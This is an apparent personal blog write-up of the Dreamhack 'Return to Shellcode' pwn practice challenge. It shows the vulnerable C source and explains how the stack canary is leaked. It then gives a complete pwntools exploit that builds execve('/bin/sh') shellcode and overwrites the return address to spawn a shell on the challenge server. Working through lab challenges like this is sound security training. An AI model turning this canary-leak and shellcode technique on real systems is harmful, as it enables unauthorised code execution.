+++
date = '2026-05-06'
draft = false
title = 'Dreamhack Return To Shellcode Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview

Exploit Tech: Return to Shellcode에서 실습하는 문제입니다.

---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[88]; // [rsp+0h] [rbp-60h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n", 96);
  puts("[1] Leak the canary");
  printf("Input: ");
  fflush(stdout);
  read(0, buf, 0x100u);
  printf("Your input is '%s'\n", buf);
  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);
  return 0;
}
```

## Identifying the vulnerabilities

This challenge is being very thoughtful; even spelling out the stack layout to us. We do have a canary, so we can leak that first. Then, shellcode challenge => we redirect the flow into `buf` where we place our shellcode. I feel like we have permission to do anything, so we can just pop a shell.

To leak the canary just overwrite the null byte from `buf` (at `buf[88]`), and it will just print what's right after it - the canary!

I spend a little bit more time debugging that I should've, because I forgot to actually *send* the payload, but now everything works smoothly!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/ret2shellcode/r2s')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:16070'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#gdb.attach(p, gdbscript = '''
#bva *main +0xF4 
#''')

p.recvuntil(b"buf: ")

leak = p.recvline().strip()
leak = int(leak, 16)
print(f"leak is {hex(leak)}")

payload = b"A" * 88 + b"C"
p.recvuntil(b"Input: ")
p.send(payload)
p.recvuntil(b"C")

val = p.recv(7)
canary = u64(val.rjust(8, b"\x00"))
print(f"canary is {hex(canary)}")

shellcode = asm('''
mov rax, 0x68732f6e69622f 
push rax

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx

mov rax, 0x3b
syscall
''')

shellcode = shellcode.ljust(88, b"\x90")

p.recvuntil(b"Input: ")
payload = shellcode + p64(canary) + b"B"*8 + p64(leak)
p.send(payload)
p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/rao.py)**.
